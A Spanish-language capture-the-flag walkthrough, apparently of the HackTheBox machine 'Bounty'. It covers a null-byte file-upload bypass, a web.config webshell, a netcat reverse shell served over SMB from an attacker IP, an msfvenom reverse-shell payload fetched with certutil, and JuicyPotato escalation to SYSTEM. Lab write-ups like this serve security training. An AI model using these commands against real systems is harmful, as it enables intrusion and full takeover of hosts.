
PORT   STATE SERVICE
80/tcp open  http

-Hacemos Fuzzing y encontramos el siguiente Directorio:
	-/transfer.aspx
	-/UploadedFiles

-'/transfer.aspx' nos lleva a una Subida de Archivos y en '/UploadedFiles' se almacenan.

-No nos deja subir archivos php,asp,aspx

-Probamos a subir un file.php.jpg Obfuscado con Null Byte:
	-filename=shell.php%00.jpg
		Respuesta --> File Uploaded Succesfully

-Sin embargo, vamos a la ruta
	-http://10.10.10.93/UploadedFiles/shell.php o shell.jpg y no aparece

-Probamos a subir una webshell.config, del siguiente repo:
	https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config

-filename=webshell.config
	-Respuesta --> File Upload Succesfully!!

-Nos vamos a la ruta dónde se almacena y FUNCIONA!!:
	-http://10.10.10.93/UploadedFiles/web.config?cmd=whoami
		**bounty\merlin**

### Ganar Acceso a la Máquina

-Nos Copiamos el nc.exe en el Directorio actual:
	-cp /usr/share/SecLists/Web-Shells/FuzzDB/nc.exe .

-Iniciamos un servidor con impacket-smbserver:
	-impacket-smbserver smb .    o    -impacket-smbserver smb $(pwd) -smb2support 

-Nos ponemos en escucha con Netcat:
	-rlwrap nc -lvnp 443

-Ejecutamos el nc.exe a través de la webshell.config desde la URL:
	-http://10.10.10.93/UploadedFiles/web.config
		-En la webshell --> \\10.10.14.21\smb\nc.exe 10.10.14.21 443 -e cmd
			**c:\windows\system32\inetsrv>whoami**
				**bounty\merlin**

## Escalada de Privilegios

-whoami /priv:
	SeImpersonatePrivilege

-Probamos con el exploit de JuicyPotato:
	1-Generamos la RS con msfvenom
		-msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.21 LPORT=4444 -f exe -o shell64.exe
	2-Nos Descargamos el exploit de JuicyPotato
	3-Abrimos servidor con Python
	4-Los descargamos en /Temp de la Máquina Víctima con certutil

-Ejecutamos el JuicyPotato + la RS y obtenemos conexión:
	-c:\Temp>.\JuicyPotato.exe -l 1234 -p shell64.exe -t *
		**C:\Windows\system32>whoami**
			**nt authority\system**